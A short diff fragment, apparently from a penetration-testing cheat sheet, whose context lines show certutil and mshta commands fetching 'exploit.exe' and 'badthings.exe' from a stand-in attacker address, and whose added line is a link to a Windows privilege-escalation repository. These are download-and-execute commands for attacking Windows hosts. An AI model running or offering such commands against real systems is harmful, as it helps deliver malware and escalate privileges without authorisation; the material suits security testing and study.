@@ -54,3 +54,5 @@ certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe
 
 [mshta]
 mshta http://10.10.10.10/badthings.exe
+
+https://github.com/frizb/Windows-Privilege-Escalation
